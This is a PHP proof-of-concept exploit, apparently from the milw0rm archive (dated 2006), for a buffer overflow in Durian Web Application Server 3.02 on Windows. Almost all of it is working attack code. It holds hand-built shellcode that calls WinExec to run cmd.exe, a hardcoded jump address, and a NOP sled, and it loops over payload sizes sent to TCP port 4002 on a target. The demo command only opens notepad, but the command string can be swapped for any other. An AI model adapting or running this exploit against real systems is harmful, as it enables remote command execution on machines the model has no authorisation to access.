<?php
/*
Durian Web Application Server 3.02 freeware for Win32 buffer
overflow execute command exploit

by rgod
mail: retrog at alice dot it
site: http://retrogod.altervista.org

tested against xp sp2 ita

software site -> http://sourceforge.net/projects/durian/

*/

error_reporting(E_ALL);
$address = "192.168.1.3";
$service_port = "4002";

$shellcode =
"\xeb\x1b".
"\x5b".
"\x31\xc0".
"\x50".
"\x31\xc0".
"\x88\x43\x59".
"\x53".
"\xbb\x6d\x13\x86\x7c". //WinExec, 0x7c86136d
"\xff\xd3".
"\x31\xc0".
"\x50".
"\xbb\xda\xcd\x81\x7c". //ExitProcess, 0x7c81cdda
"\xff\xd3".
"\xe8\xe0\xff\xff\xff".
"\x63\x6d\x64".
"\x2e".
"\x65".
"\x78\x65".
"\x20\x2f".
"\x63\x20".
"cmd.exe /c start notepad & ";

//$eip="\x72\xe0\xf1\x00";//DEP disabled
$eip="\x72\xe0\xf2\x00";

$ch  =array("\xaa","\xa0","\x41");
$size=array(30,70,150,330,520,700,1400,2300);

    for ($j=0; $j<count($ch); $j++){
        for ($i=0; $i<count($size); $i++){
            $junk="";
            if (($j==2) and ($i==7)){
                $junk ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVXXXX";
                $junk.="YYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuu";
		$junk.=$eip; //jmp shellcode
		for ($n=1; $n<=100; $n++){
		    $junk.="\x90";
		}
		$junk.=$shellcode;
                for ($n=1; $n=(2300-strlen($junk)); $n++){
		    $junk.="\x90";
		}
            }
            else {
		for ($k=1; $k<=$size[$i]; $k++){
                    $junk.=$ch[$j];
                }
	    }
            $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            if ($socket < 0) {
                die("socket_create() failed:\n reason: " . socket_strerror($socket) . "\n");
            }
            $result = socket_connect($socket, $address, $service_port);
            if ($result < 0) {
                die("socket_connect() failed:\n reason: ($result) " . socket_strerror($result) . "\n");
            }
            $in = $junk;
            socket_write($socket, $in, strlen ($in));
            socket_close($socket);
        }
   }
?>

# milw0rm.com [2006-12-29]